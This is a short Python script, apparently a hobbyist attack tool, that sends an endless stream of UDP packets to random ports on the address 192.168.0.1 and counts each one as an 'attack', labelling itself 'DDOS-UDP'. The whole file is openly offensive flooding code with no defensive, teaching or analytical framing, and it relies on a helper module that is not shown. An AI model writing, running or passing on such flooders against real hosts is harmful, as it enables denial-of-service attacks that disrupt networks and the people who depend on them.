import socket
from rport import randomize_port
def udp_attack(ip):

	print("Initializing DDOS-UDP")
	s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
	message = b'You are being DDOS-UDP.'
	counter = 0
	while 1:
		port = randomize_port()
		s.sendto(message,(ip,port))
		counter+=1
		print(str(counter) + "attacks at port:" + str(port))

udp_attack("192.168.0.1")




